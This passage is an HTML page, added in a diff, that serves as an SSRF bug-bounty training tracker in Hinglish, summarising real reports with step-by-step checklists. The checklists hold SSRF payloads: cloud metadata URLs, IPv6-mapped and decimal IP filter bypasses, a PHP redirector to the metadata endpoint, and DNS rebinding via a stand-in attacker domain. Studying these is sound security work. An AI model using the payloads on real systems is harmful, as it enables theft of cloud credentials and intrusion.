@@ -1,0 +1,2444 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mission 07 — SSRF Mastery</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@700;900&family=Inter:wght@300;400;500;600;700&display=swap');
+
+        :root {
+            --bg-deep: #080c12;
+            --bg-card: #0d1520;
+            --bg-card2: #111b2a;
+            --bg-box: #0a1219;
+            --border: #1a2d40;
+            --border-glow: #ff6b3533;
+            --cyan: #00c8ff;
+            --cyan-dim: #00a8d4;
+            --cyan-glow: #00c8ff55;
+            --blue: #4488ff;
+            --purple: #9b59ff;
+            --green: #00ff88;
+            --yellow: #ffd700;
+            --orange: #ff8c42;
+            --red: #ff4757;
+            --accent: #ff6b35;
+            --text-primary: #e8f4f8;
+            --text-secondary: #7ba8c0;
+            --text-dim: #4a7090;
+            --severity-crit: #ff2d55;
+            --severity-high: #ff6b35;
+            --severity-med: #ffd700;
+            --severity-low: #00ff88;
+            --severity-info: #4488ff
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            background: var(--bg-deep);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            background-image: radial-gradient(ellipse at 20% 0%, #ff6b3508 0%, transparent 50%), radial-gradient(ellipse at 80% 100%, #4488ff06 0%, transparent 50%)
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, #ff6b3503 2px, #ff6b3503 4px);
+            pointer-events: none;
+            z-index: 0
+        }
+
+        .mission-header {
+            text-align: center;
+            padding: 60px 20px 40px;
+            position: relative
+        }
+
+        .mission-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff6b3522, #ff2d5522);
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            letter-spacing: 4px;
+            padding: 6px 20px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            text-transform: uppercase
+        }
+
+        .mission-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(28px, 5vw, 52px);
+            font-weight: 900;
+            background: linear-gradient(135deg, #ff6b35, #ff2d55, #9b59ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.1;
+            margin-bottom: 8px
+        }
+
+        .mission-subtitle {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--text-secondary);
+            letter-spacing: 2px
+        }
+
+        .mission-stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 30px;
+            flex-wrap: wrap
+        }
+
+        .stat-item {
+            text-align: center
+        }
+
+        .stat-num {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--accent)
+        }
+
+        .stat-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            text-transform: uppercase
+        }
+
+        .master-progress {
+            max-width: 900px;
+            margin: 0 auto 50px;
+            padding: 0 20px
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px
+        }
+
+        .progress-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--accent);
+            letter-spacing: 2px
+        }
+
+        .progress-pct {
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            color: var(--accent)
+        }
+
+        .progress-bar-wrap {
+            height: 6px;
+            background: #1a2d40;
+            border-radius: 3px;
+            overflow: hidden
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), #ff2d55);
+            border-radius: 3px;
+            transition: width .5s ease;
+            box-shadow: 0 0 12px #ff6b3555;
+            width: 0%
+        }
+
+        .phase-section {
+            max-width: 1100px;
+            margin: 0 auto 60px;
+            padding: 0 20px
+        }
+
+        .phase-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 28px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .phase-number {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--accent);
+            background: #ff6b3514;
+            border: 1px solid #ff6b3533;
+            padding: 4px 10px;
+            border-radius: 2px;
+            letter-spacing: 2px
+        }
+
+        .phase-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary)
+        }
+
+        .phase-count {
+            margin-left: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim)
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(480px, 1fr));
+            gap: 24px
+        }
+
+        .report-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: all .3s ease;
+            position: relative;
+            animation: fadeInUp .4s ease both
+        }
+
+        .report-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--accent), #ff2d55);
+            opacity: 0;
+            transition: opacity .3s ease
+        }
+
+        .report-card:hover {
+            border-color: var(--border-glow);
+            box-shadow: 0 8px 40px #ff6b3512, 0 0 0 1px #ff6b3522;
+            transform: translateY(-2px)
+        }
+
+        .report-card:hover::before {
+            opacity: 1
+        }
+
+        .card-header {
+            padding: 18px 20px 14px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 12px;
+            border-bottom: 1px solid var(--border);
+            background: var(--bg-card2)
+        }
+
+        .card-meta {
+            flex: 1
+        }
+
+        .report-number {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            margin-bottom: 4px
+        }
+
+        .report-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            line-height: 1.3
+        }
+
+        .report-target {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #ff9060;
+            margin-top: 4px
+        }
+
+        .severity-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 4px 10px;
+            border-radius: 3px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            flex-shrink: 0
+        }
+
+        .sev-critical {
+            background: #ff2d5520;
+            border: 1px solid #ff2d5560;
+            color: var(--severity-crit)
+        }
+
+        .sev-high {
+            background: #ff6b3520;
+            border: 1px solid #ff6b3560;
+            color: var(--severity-high)
+        }
+
+        .sev-medium {
+            background: #ffd70020;
+            border: 1px solid #ffd70060;
+            color: var(--severity-med)
+        }
+
+        .sev-low {
+            background: #00ff8820;
+            border: 1px solid #00ff8860;
+            color: var(--severity-low)
+        }
+
+        .sev-info {
+            background: #4488ff20;
+            border: 1px solid #4488ff60;
+            color: var(--severity-info)
+        }
+
+        .sev-na {
+            background: #7ba8c020;
+            border: 1px solid #7ba8c060;
+            color: var(--text-secondary)
+        }
+
+        .technique-tag {
+            display: inline-block;
+            background: #ff6b3514;
+            border: 1px solid #ff6b3544;
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 2px;
+            letter-spacing: 1px;
+            margin: 4px 4px 0 0
+        }
+
+        .card-body {
+            padding: 16px 20px
+        }
+
+        .scenario-box {
+            background: var(--bg-box);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 4px;
+            padding: 12px 14px;
+            margin-bottom: 16px
+        }
+
+        .scenario-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--accent);
+            letter-spacing: 2px;
+            margin-bottom: 6px;
+            text-transform: uppercase
+        }
+
+        .scenario-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5
+        }
+
+        .checklist-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--blue);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .checklist-label::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border)
+        }
+
+        .checklist {
+            list-style: none
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 7px 0;
+            border-bottom: 1px solid #1a2d4060;
+            cursor: pointer;
+            transition: all .2s ease;
+            border-radius: 3px
+        }
+
+        .checklist-item:last-child {
+            border-bottom: none
+        }
+
+        .checklist-item:hover {
+            background: #ff6b3506;
+            padding-left: 6px
+        }
+
+        .item-checkbox {
+            width: 18px;
+            height: 18px;
+            border: 1.5px solid var(--accent);
+            border-radius: 3px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 1px;
+            transition: all .2s ease;
+            background: transparent
+        }
+
+        .checklist-item.done .item-checkbox {
+            background: var(--green);
+            border-color: var(--green)
+        }
+
+        .checklist-item.done .item-checkbox::after {
+            content: '✓';
+            color: #080c12;
+            font-size: 11px;
+            font-weight: 700
+        }
+
+        .item-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            flex-shrink: 0;
+            padding-top: 1px
+        }
+
+        .item-text {
+            font-size: 12.5px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            flex: 1;
+            transition: color .2s
+        }
+
+        .checklist-item.done .item-text {
+            color: var(--text-dim);
+            text-decoration: line-through;
+            text-decoration-color: #4a709066
+        }
+
+        .card-progress {
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border)
+        }
+
+        .card-progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px
+        }
+
+        .card-progress-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--text-dim);
+            letter-spacing: 1px
+        }
+
+        .card-progress-pct {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--green)
+        }
+
+        .card-bar-wrap {
+            height: 3px;
+            background: #1a2d40;
+            border-radius: 2px;
+            overflow: hidden
+        }
+
+        .card-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--green));
+            border-radius: 2px;
+            transition: width .4s ease;
+            width: 0%
+        }
+
+        .mindset-box {
+            background: #9b59ff0a;
+            border: 1px solid #9b59ff33;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 14px
+        }
+
+        .mindset-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--purple);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .mindset-text {
+            font-size: 12px;
+            color: #b89ddd;
+            line-height: 1.5;
+            font-style: italic
+        }
+
+        .protip-box {
+            background: #ffd70009;
+            border: 1px solid #ffd70033;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .protip-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--yellow);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .protip-text {
+            font-size: 12px;
+            color: #c9a83a;
+            line-height: 1.5
+        }
+
+        .chain-box {
+            background: #ff6b3509;
+            border: 1px solid #ff6b3530;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .chain-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--orange);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .chain-formula {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #d4823a;
+            line-height: 1.6
+        }
+
+        .impact-box {
+            background: #ff2d5509;
+            border: 1px solid #ff2d5530;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .impact-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--red);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .impact-text {
+            font-size: 12px;
+            color: #d44466;
+            line-height: 1.5
+        }
+
+        .filter-bar {
+            max-width: 1100px;
+            margin: 0 auto 30px;
+            padding: 0 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            align-items: center
+        }
+
+        .filter-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 1px
+        }
+
+        .filter-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            padding: 5px 14px;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all .2s ease;
+            letter-spacing: 1px
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: #ff6b3510
+        }
+
+        .mission-footer {
+            text-align: center;
+            padding: 40px 20px 60px;
+            border-top: 1px solid var(--border)
+        }
+
+        .footer-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim);
+            letter-spacing: 2px
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-deep)
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #1a2d40;
+            border-radius: 3px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent)
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .report-card:nth-child(2n) {
+            animation-delay: .05s
+        }
+
+        .report-card:nth-child(3n) {
+            animation-delay: .10s
+        }
+
+        code.c {
+            color: #ff9060;
+            font-size: 11px;
+            background: #ff6b3511;
+            padding: 1px 5px;
+            border-radius: 3px
+        }
+
+        @media(max-width:700px) {
+            .cards-grid {
+                grid-template-columns: 1fr
+            }
+
+            .mission-stats {
+                gap: 20px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="mission-header">
+        <div class="mission-badge">⬡ MISSION 07 ⬡ SSRF MASTERY ⬡</div>
+        <h1 class="mission-title">SSRF<br>MASTERY</h1>
+        <p class="mission-subtitle">// BASIC SSRF · BLIND SSRF · CLOUD METADATA · PROTOCOL SMUGGLING · CHAINS — 30 REAL
+            BOUNTY REPORTS + 5 BONUS</p>
+        <div class="mission-stats">
+            <div class="stat-item">
+                <div class="stat-num" id="totalReports">35</div>
+                <div class="stat-label">Total Reports</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="completedItems">0</div>
+                <div class="stat-label">Steps Done</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num">85</div>
+                <div class="stat-label">Techniques Mapped</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="completedCards">0</div>
+                <div class="stat-label">Reports Completed</div>
+            </div>
+        </div>
+    </header>
+    <div class="master-progress">
+        <div class="progress-header"><span class="progress-label">◈ OVERALL MISSION PROGRESS</span><span
+                class="progress-pct" id="masterPct">0%</span></div>
+        <div class="progress-bar-wrap">
+            <div class="progress-bar-fill" id="masterBar"></div>
+        </div>
+    </div>
+    <div class="filter-bar">
+        <span class="filter-label">FILTER ▸</span>
+        <button class="filter-btn active" onclick="filterCards('all',this)">ALL (35)</button>
+        <button class="filter-btn" onclick="filterCards('critical',this)">🔴 CRITICAL</button>
+        <button class="filter-btn" onclick="filterCards('high',this)">🟠 HIGH</button>
+        <button class="filter-btn" onclick="filterCards('medium',this)">🟡 MEDIUM</button>
+        <button class="filter-btn" onclick="filterCards('low',this)">🟢 LOW</button>
+        <button class="filter-btn" onclick="filterCards('na',this)">⚪ N/A</button>
+        <button class="filter-btn" onclick="filterCards('incomplete',this)">⏳ IN PROGRESS</button>
+        <button class="filter-btn" onclick="filterCards('complete',this)">✅ COMPLETE</button>
+    </div>
+
+    <!-- ═══ PHASE 1 — CLASSIC / BASIC SSRF ═══ -->
+    <section class="phase-section" id="phase1">
+        <div class="phase-header"><span class="phase-number">PHASE 01</span><span class="phase-title">CLASSIC / BASIC
+                SSRF ATTACKS</span><span class="phase-count" id="p1count">0 / 6 reports</span></div>
+        <div class="cards-grid" id="grid-phase1">
+
+            <!-- REPORT #01 -->
+            <div class="report-card" data-severity="high" id="report-01">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #01 · Category 35.2</div>
+                        <div class="report-title">Game Export SSRF — URL Parameter Manipulation (Lichess)</div>
+                        <div class="report-target">🎯 lichess.org · @oblivionsage · High · CVE-2025-34016</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">URL Param SSRF</span><span
+                                class="technique-tag">Open Source Hunting</span><span class="technique-tag">Cloud
+                                Metadata</span></div>
+                    </div><span class="severity-badge sev-high">🟠 HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Lichess ke game export mein <code class="c">players</code> parameter
+                            seedha <code class="c">ws.url(url).get()</code> mein ja raha tha bina validation ke. Hacker
+                            ne Github par source code dekha, <code class="c">ws.url</code> dhoondha, aur server ko apna
+                            URL fetch karwa diya → Cloud Metadata + Internal Network access.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Github Repos scan karo</strong> — Agar company ka code public
+                                hai, toh <code class="c">http</code>, <code class="c">url</code>, <code
+                                    class="c">fetch</code>, <code class="c">request</code> keywords dhoondho.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Webhook se test karo</strong> — Pehle <code
+                                    class="c">webhook.site</code> ya <code class="c">interact.sh</code> use karo, seedha
+                                internal IPs mat try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Export features check karo</strong> — PDF, CSV, PGN jahan bhi
+                                data export hota hai, wahan SSRF ke chances highest hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Cloud Metadata try karo</strong> — <code
+                                    class="c">?players=http://169.254.169.254/latest/meta-data/</code></span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Internal scanning karo</strong> — <code
+                                    class="c">http://127.0.0.1:8080</code> se admin panels dhoondho.</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">👑 VETERAN MINDSET</div>
+                        <div class="mindset-text">"Input Validation is the only cure for SSRF." Lichess jaisa bada
+                            platform bhi ek simple parameter ki wajah se vulnerable ho gaya. Open source code = SSRF ka
+                            treasure map.</div>
+                    </div>
+                    <div class="chain-box">
+                        <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                        <div class="chain-formula">Source Code Review → URL Param Discovery → Webhook Confirm → Cloud
+                            Metadata → AWS Keys → Full Takeover</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #02 -->
+            <div class="report-card" data-severity="medium" id="report-02">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #02 · Category 35.3</div>
+                        <div class="report-title">Webhook SSRF — IPv6-mapped IPv4 Filter Bypass (HackerOne)</div>
+                        <div class="report-target">🎯 hackerone.com · @madara_ & @red_darkin · Medium (4.9) · $2,500
+                        </div>
+                        <div style="margin-top:8px;"><span class="technique-tag">IPv6 Mapping</span><span
+                                class="technique-tag">Filter Bypass</span><span class="technique-tag">Redirect
+                                Chain</span></div>
+                    </div><span class="severity-badge sev-medium">🟡 MEDIUM</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">HackerOne ke Webhook feature mein <code class="c">127.0.0.1</code>
+                            aur <code class="c">169.254.169.254</code> block the. Par filter sirf IPv4 check kar raha
+                            tha. Hacker ne IPv6-mapped format <code class="c">[::ffff:a9fe:a9fe]</code> use kiya →
+                            Filter bypass → PHP redirect script se AWS Metadata + DataDog Agent endpoints leak!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>IPv6 Mapping try karo</strong> — <code
+                                    class="c">[::ffff:a9fe:a9fe]</code> = 169.254.169.254 ka IPv6 format.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Decimal Encoding try karo</strong> — <code
+                                    class="c">http://2852039166</code> = 169.254.169.254 ka decimal conversion.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Redirect script banao</strong> — PHP file host karo: <code
+                                    class="c">Location: http://[::ffff:a9fe:a9fe]</code></span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Internal ports scan karo</strong> — Port 5000 pe DataDog Agent
+                                ke debugging endpoints (<code class="c">/debug/pprof/heap</code>) check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>DNS Rebinding bhi try karo</strong> — <code
+                                    class="c">attacker-dns.com</code> se IP swap attack.</span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">💡 PRO TIP</div>
+                        <div class="protip-text">Blocklists are never enough! HackerOne jaisi security company bhi ek
+                            format miss kar gayi. SSRF dhoondhte waqt hamesha URL ko IPv6, Octal, Hex, Decimal encodings
+                            mein test karo.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #03 -->
+            <div class="report-card" data-severity="medium" id="report-03">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #03 · Category 35.4</div>
+                        <div class="report-title">Protocol Redirect Bypass — HTTPS to HTTP Downgrade (Streamlabs)</div>
+                        <div class="report-target">🎯 streamlabs.com · @nrockhouse · Medium (5.0) · $200</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Protocol Downgrade</span><span
+                                class="technique-tag">302 Redirect</span><span class="technique-tag">Cloudbot
+                                readapi</span></div>
+                    </div><span class="severity-badge sev-medium">🟡 MEDIUM</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Streamlabs Cloudbot ka <code class="c">{readapi.URL}</code> sirf
+                            HTTPS allow karta tha. Hacker ne apne HTTPS server se <code class="c">302 Redirect</code>
+                            bheja → <code class="c">http://169.254.169.254/latest/meta-data/</code>. Backend ne redirect
+                            follow kiya → HTTPS check bypass → AWS metadata fetch!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Redirect following check karo</strong> — Kya server 301/302
+                                redirects follow karta hai? Protocol downgrade (HTTPS→HTTP) try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>HTTPS-only bypass karo</strong> — Apne HTTPS server se
+                                redirect karwao HTTP internal target par.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>PHP redirector banao</strong> — <code
+                                    class="c">&lt;?php header('Location: http://169.254.169.254/'); ?&gt;</code></span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Content-Type check karo</strong> — Server <code
+                                    class="c">application/json</code> ya <code class="c">text/plain</code> render karta
+                                hai?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Response parsing limitations check karo</strong> — Curly
+                                braces (<code class="c">{}</code>) block hain? Recursive variable loop se JSON truncate
+                                ho sakta hai.</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">👑 VETERAN MINDSET</div>
+                        <div class="mindset-text">"Input validation at the first level is not enough. Agar HTTP client
+                            redirects follow karta hai, toh attacker pehle check bypass karke internal protocols tak
+                            pahunch sakta hai."</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #04 -->
+            <div class="report-card" data-severity="low" id="report-04">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #04 · Category 35.5 · CVE-2021-22969</div>
+                        <div class="report-title">DNS Rebinding Attack — ToCToU Bypass (Concrete CMS)</div>
+                        <div class="report-target">🎯 Concrete CMS · @adrian_t (Fortbridge) · Low (3.5)</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">DNS Rebinding</span><span
+                                class="technique-tag">ToCToU</span><span class="technique-tag">TTL Manipulation</span>
+                        </div>
+                    </div><span class="severity-badge sev-low">🟢 LOW</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">CMS ne pehle URL ka IP resolve karke check kiya — private toh nahi?
+                            Par hacker ne DNS Rebinding use kiya: pehli query → Public IP (validation pass), dusri query
+                            → <code class="c">169.254.169.254</code> (AWS Metadata). TTL=0 hone se DNS cache expire hua
+                            → IAM credentials steal!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>DNS Rebinding tool setup karo</strong> — <code
+                                    class="c">rbndr.us</code> ya <code class="c">1u.ms</code> se domain banao jo 2 IPs
+                                ke beech switch kare.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>TTL check karo</strong> — Agar server DNS response cache nahi
+                                kar raha, toh rebinding ke chances 100% hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>IMDSv1 vs v2 check karo</strong> — v1 hamesha SSRF ke liye
+                                vulnerable hai, v2 Token-based hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Upload from Remote Server feature dhoondho</strong> — File
+                                import features DNS Rebinding ke prime targets hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Multiple attempts karo</strong> — DNS Rebinding race condition
+                                hai, 10-15 baar try karo taaki timing match ho.</span>
+                        </li>
+                    </ul>
+                    <div class="chain-box">
+                        <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                        <div class="chain-formula">DNS Rebinding → IP Validation Bypass → AWS Metadata → IAM Keys →
+                            S3/EC2 → Full Cloud Takeover</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #05 -->
+            <div class="report-card" data-severity="medium" id="report-05">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #05 · Category 35.6</div>
+                        <div class="report-title">Blind to Full SSRF — oEmbed Meta-Tag Injection (Ghost CMS)</div>
